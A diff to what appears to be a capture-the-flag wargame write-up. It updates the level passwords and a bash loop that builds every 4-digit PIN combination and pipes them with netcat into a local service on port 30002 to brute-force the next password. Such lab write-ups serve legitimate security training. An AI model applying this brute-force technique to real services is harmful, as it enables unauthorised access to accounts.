@@ -6,7 +6,7 @@ We need to write a script to do this for us, because doing it by hand would take
 
 ```sh
 #!/bin/bash
-password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+password=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 
 for i in {0000..9999}; do
     echo $password $i >>list.txt
@@ -14,6 +14,6 @@ done
 ```
 
 After running this script we can submit `list.txt` to `localhost:30002`
-> `cat list.txt | nc localhost 30002`
+> `cat list.txt | nc localhost 30002 | uniq`
 
-This command will eventually provide the correct 4-character code to the server, at which point it will respond with the password: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
+This command will eventually provide the correct 4-character code to the server, at which point it will respond with the password: `p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`
